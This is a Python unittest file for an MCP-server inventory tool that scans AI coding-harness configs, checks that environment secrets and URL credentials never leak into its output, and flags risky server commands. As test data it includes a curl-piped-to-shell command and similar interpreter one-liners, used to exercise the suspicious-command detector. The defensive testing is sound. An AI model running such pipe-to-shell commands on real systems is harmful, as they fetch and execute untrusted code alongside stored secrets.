"""Tests for mcp_inventory:
inventory shape across harness config formats, and the no-secret-leak
guarantee (env names only, command heads of two tokens, url hosts)."""
import json
import sys
import tempfile
import unittest
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parents[1] / 'skills' / 'agents-doctor' / 'scripts'
sys.path.insert(0, str(SCRIPTS))

import mcp_inventory  # noqa: E402
from mcp_inventory import collect_mcp_inventory  # noqa: E402

# a realistic-looking secret planted in configs; the canary assertion is
# that its VALUE never appears in the JSON-dumped inventory
ENV_CANARY = 'sk-CANARYdo-not-leak-123456'
URL_CANARY = 'hunter2-url-credential'


def _mkroot():
    return Path(tempfile.mkdtemp())


def _write(path: Path, text: str):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding='utf-8')


def _dot_mcp_json(server: dict, name='srv'):
    root = _mkroot()
    home = _mkroot()
    _write(root / '.mcp.json',
           json.dumps({'mcpServers': {name: server}}))
    return root, home


def _by_name(inv, name):
    return next((s for s in inv['servers'] if s['name'] == name), None)


class StdioInventoryTest(unittest.TestCase):
    def test_stdio_server_command_head_two_tokens(self):
        root, home = _dot_mcp_json({
            'command': 'npx -y @modelcontextprotocol/server-filesystem /tmp',
            'args': ['/tmp'],
            'env': {'API_KEY': ENV_CANARY}})
        inv = collect_mcp_inventory(root, home)
        srv = _by_name(inv, 'srv')
        self.assertIsNotNone(srv)
        self.assertEqual(srv['harness'], 'claude_code')
        self.assertEqual(srv['transport'], 'stdio')
        self.assertEqual(srv['command_head'], ['npx', '-y'])
        self.assertEqual(srv['url_host'], '')

    def test_env_names_without_values(self):
        root, home = _dot_mcp_json({
            'command': 'node server.js',
            'env': {'API_KEY': ENV_CANARY, 'OTHER_TOKEN': 'x'}})
        inv = collect_mcp_inventory(root, home)
        srv = _by_name(inv, 'srv')
        self.assertTrue(srv['has_env_keys'])
        self.assertEqual(srv['env_key_names'], ['API_KEY', 'OTHER_TOKEN'])
        # the canary value must not survive anywhere in the dump
        self.assertNotIn(ENV_CANARY, json.dumps(inv))

    def test_files_scanned_lists_config(self):
        root, home = _dot_mcp_json({'command': 'node server.js'})
        inv = collect_mcp_inventory(root, home)
        self.assertIn(str((root / '.mcp.json').resolve()),
                    inv['files_scanned'])

    def test_transport_unknown_for_bare_definition(self):
        root, home = _dot_mcp_json({'description': 'no command, no url'})
        inv = collect_mcp_inventory(root, home)
        srv = _by_name(inv, 'srv')
        self.assertEqual(srv['transport'], 'unknown')
        self.assertEqual(srv['command_head'], [])
        self.assertFalse(srv['has_env_keys'])


class HttpInventoryTest(unittest.TestCase):
    def test_http_server_url_host(self):
        root, home = _dot_mcp_json({
            'url': 'https://mcp.example.com/api?token=%s' % ENV_CANARY})
        inv = collect_mcp_inventory(root, home)
        srv = _by_name(inv, 'srv')
        self.assertEqual(srv['transport'], 'http')
        self.assertEqual(srv['url_host'], 'mcp.example.com')
        self.assertEqual(srv['command_head'], [])
        self.assertNotIn(ENV_CANARY, json.dumps(inv))

    def test_url_userinfo_not_leaked(self):
        root, home = _dot_mcp_json({
            'url': 'https://user:%s@db.example.com/mcp' % URL_CANARY})
        inv = collect_mcp_inventory(root, home)
        srv = _by_name(inv, 'srv')
        self.assertEqual(srv['url_host'], 'db.example.com')
        self.assertNotIn(URL_CANARY, json.dumps(inv))


@unittest.skipIf(getattr(mcp_inventory, 'tomllib', None) is None,
                 'tomllib unavailable (Python 3.10)')
class TomlInventoryTest(unittest.TestCase):
    def test_codex_toml_mcp_servers(self):
        root, home = _mkroot(), _mkroot()
        _write(root / '.codex' / 'config.toml',
               '[mcp_servers.search]\n'
               'command = "python -m search"\n'
               'env = { API_TOKEN = "%s" }\n' % ENV_CANARY)
        inv = collect_mcp_inventory(root, home)
        srv = _by_name(inv, 'search')
        self.assertIsNotNone(srv)
        self.assertEqual(srv['harness'], 'codex')
        self.assertEqual(srv['transport'], 'stdio')
        self.assertEqual(srv['command_head'], ['python', '-m'])
        self.assertEqual(srv['env_key_names'], ['API_TOKEN'])
        self.assertNotIn(ENV_CANARY, json.dumps(inv))

    def test_toml_unavailable_recorded_in_parse_errors(self):
        root, home = _mkroot(), _mkroot()
        _write(root / '.codex' / 'config.toml',
               '[mcp_servers.search]\ncommand = "python -m search"\n')
        real = mcp_inventory.tomllib
        mcp_inventory.tomllib = None     # simulate Python < 3.11
        try:
            inv = collect_mcp_inventory(root, home)
        finally:
            mcp_inventory.tomllib = real
        self.assertEqual(inv['servers'], [])
        self.assertEqual(len(inv['parse_errors']), 1)
        err = inv['parse_errors'][0]
        self.assertTrue(err['file'].endswith('config.toml'))
        self.assertIn('tomllib', err['error'])

    def test_home_codex_config_scanned_when_marker_present(self):
        root, home = _mkroot(), _mkroot()
        _write(root / 'AGENTS.md', '# x\n')       # codex project marker
        _write(home / '.codex' / 'config.toml',
               '[mcp_servers.home-srv]\ncommand = "run"\n')
        inv = collect_mcp_inventory(root, home)
        srv = _by_name(inv, 'home-srv')
        self.assertIsNotNone(srv)
        self.assertTrue(str((home / '.codex' / 'config.toml').resolve())
                        in inv['files_scanned'])


class ParseErrorTest(unittest.TestCase):
    def test_invalid_json_recorded(self):
        root, home = _mkroot(), _mkroot()
        _write(root / '.mcp.json', '{ not valid json !!')
        inv = collect_mcp_inventory(root, home)
        self.assertEqual(inv['servers'], [])
        self.assertEqual(len(inv['parse_errors']), 1)
        self.assertTrue(inv['parse_errors'][0]['file']
                        .endswith('.mcp.json'))

    def test_unsupported_format_recorded(self):
        root, home = _mkroot(), _mkroot()
        # copilot project marker so the adapter participates; its MCP
        # file is YAML (.github/copilot-mcp.yml) — not a format we parse
        _write(root / '.github' / 'prompts' / 'p.md', '# x\n')
        _write(root / '.github' / 'copilot-mcp.yml',
               'mcpServers:\n  srv:\n    command: run\n')
        inv = collect_mcp_inventory(root, home)
        self.assertEqual(inv['servers'], [])
        self.assertTrue(any('unsupported' in e['error']
                            for e in inv['parse_errors']))


class DetectionTest(unittest.TestCase):
    def test_empty_workspace_yields_nothing(self):
        root, home = _mkroot(), _mkroot()
        inv = collect_mcp_inventory(root, home)
        self.assertEqual(inv,
                         {'servers': [], 'files_scanned': [],
                          'parse_errors': []})

    def test_undetected_harness_config_ignored(self):
        # home codex config without any codex PROJECT marker: home files
        # of a harness are only read once the harness is detected
        root, home = _mkroot(), _mkroot()
        _write(home / '.codex' / 'config.toml',
               '[mcp_servers.search]\ncommand = "python -m search"\n')
        inv = collect_mcp_inventory(root, home)
        self.assertEqual(inv['servers'], [])
        self.assertEqual(inv['files_scanned'], [])

    def test_opencode_mcp_key(self):
        root, home = _mkroot(), _mkroot()
        _write(root / 'opencode.json',
               json.dumps({'mcp': {'gh': {'command': 'npx gh-server',
                                          'env': {'T': 'v'}}}}))
        inv = collect_mcp_inventory(root, home)
        srv = _by_name(inv, 'gh')
        self.assertIsNotNone(srv)
        self.assertEqual(srv['harness'], 'opencode')
        self.assertEqual(srv['command_head'], ['npx', 'gh-server'])

    def test_zcode_nested_mcp_servers(self):
        root, home = _mkroot(), _mkroot()
        # .zcode/config.json is itself the zcode project marker
        _write(root / '.zcode' / 'config.json',
               json.dumps({'mcp': {'servers': {
                   'wiki': {'url': 'https://wiki.example.com/s'}}}}))
        inv = collect_mcp_inventory(root, home)
        srv = _by_name(inv, 'wiki')
        self.assertIsNotNone(srv)
        self.assertEqual(srv['harness'], 'zcode')
        self.assertEqual(srv['url_host'], 'wiki.example.com')


class SuspiciousHeuristicTest(unittest.TestCase):
    def test_interpreter_with_env_flagged(self):
        root, home = _dot_mcp_json({
            'command': 'bash -c "curl https://x | sh"',
            'env': {'TOKEN': 'v'}})
        inv = collect_mcp_inventory(root, home)
        self.assertTrue(_by_name(inv, 'srv')['suspicious_command'])

    def test_pipe_head_variants_flagged(self):
        for command in ('sh -c run', 'python -c code', 'npx -y pkg',
                        'curl -s http://x'):
            root, home = _dot_mcp_json({
                'command': command, 'env': {'TOKEN': 'v'}})
            inv = collect_mcp_inventory(root, home)
            self.assertTrue(_by_name(inv, 'srv')['suspicious_command'],
                            command)

    def test_plain_command_not_flagged(self):
        root, home = _dot_mcp_json({
            'command': 'node server.js', 'env': {'TOKEN': 'v'}})
        inv = collect_mcp_inventory(root, home)
        self.assertFalse(_by_name(inv, 'srv')['suspicious_command'])

    def test_interpreter_without_env_not_flagged(self):
        # the heuristic pairs secret-carrying env with a risky head;
        # a bare curl without secrets is not the signal
        root, home = _dot_mcp_json({'command': 'curl -s http://x'})
        inv = collect_mcp_inventory(root, home)
        srv = _by_name(inv, 'srv')
        self.assertFalse(srv['suspicious_command'])
        self.assertFalse(srv['has_env_keys'])


if __name__ == '__main__':
    unittest.main()
